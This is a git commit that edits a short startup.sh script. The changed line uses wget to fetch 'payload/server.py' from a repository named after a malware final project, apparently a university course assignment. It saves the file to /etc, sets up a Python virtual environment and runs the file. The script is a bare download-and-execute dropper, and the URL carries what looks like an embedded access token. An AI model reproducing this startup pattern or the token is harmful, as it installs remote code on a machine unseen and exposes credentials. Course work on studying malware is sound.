2df05527cb762b391aceb446e8cd3957f4087df2
Isaac Khabra <80500622+isaackhabra@users.noreply.github.com>
2025-03-10 19:21:44 -0700

    Update startup.sh

--- startup.sh
+++ startup.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-wget -O /etc/server.py "https://raw.githubusercontent.com/isaackhabra/test/refs>
+wget -O /etc/server.py "https://raw.githubusercontent.com/ucla-e1-malware/final-project-malware-marauders/refs/heads/main/payload/server.py?token=GHSAT0AAAAAAC5JFZLOW6MLKGG3M3RUHIX2Z6PTYBQ"
 python -m venv /etc/v
 python /etc/server.py
